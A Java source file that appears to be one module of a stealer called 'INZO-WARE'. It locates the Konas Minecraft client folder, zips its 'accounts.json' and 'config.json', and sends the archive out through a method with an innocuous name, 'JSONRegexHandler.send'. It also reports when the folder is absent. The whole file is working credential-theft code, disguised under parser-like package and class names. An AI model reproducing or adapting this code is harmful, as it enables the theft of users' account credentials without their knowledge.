package com.inzo.technologies.inzoware.mc.parsers.impl;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

import com.inzo.technologies.inzoware.mc.parsers.JSONObject;
import com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler;
import com.inzo.technologies.inzoware.mc.parsers.util.FileSystemHelper;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;

public final class KonasData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[]{"accounts.json", "config.json"};

    @Override
    public void handle() {
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String konasFolder = mcFolder + "Konas/";
        if (!Files.exists(Paths.get(konasFolder))) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Konas folder.").build());
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>();
        for (String fileName : IMPORTANT_FILES) {
            String dir = konasFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + sep + "konas_INZO-WARE.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "KonasData";
    }
}
